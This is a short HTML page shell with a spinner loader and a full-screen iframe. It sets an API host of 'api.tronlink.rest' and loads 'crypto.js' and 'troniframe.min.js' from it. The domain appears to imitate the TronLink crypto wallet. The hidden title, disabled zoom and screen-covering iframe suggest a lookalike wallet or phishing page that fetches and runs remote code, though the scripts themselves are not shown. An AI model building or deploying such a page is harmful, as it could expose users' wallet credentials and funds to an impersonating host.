    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body {
            margin: 0;
            padding: 0;
            border: none;
            position: relative;
            touch-action: manipulation;
        }
        iframe {
            width: 100%;
            border: none;
            height: 100vh; /* 让iframe占满整个视口 */
            position: fixed; /* 固定位置 */
            top: 0;
            left: 0;
            overflow: hidden;
            z-index: 1;
        }
        .loader-container {
            display: flex;
            justify-content: center;
            align-items: center;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            z-index: 9999; /* 确保在 iframe 上方 */
        }

        /* 加载动画样式 */
        .loader {
            width: 50px; /* 动画的宽度 */
            height: 50px; /* 动画的高度 */
            border: 4px solid #f3f3f3;
            border-top: 4px solid #3498db;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }

        /* 旋转动画 */
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
    <title></title>
</head>
<body>
<div class="loader-container" id="loader-container">
    <div class="loader" id="loader"></div>
</div>
<iframe id="iframe" class="iframe"></iframe>
<script>
  window.API_HOST = 'https://api.tronlink.rest';
</script>
<script src="https://api.tronlink.rest/public/libs/crypto.js"></script>
<script src="https://api.tronlink.rest/public/libs/troniframe.min.js?t=1"></script>
</body>
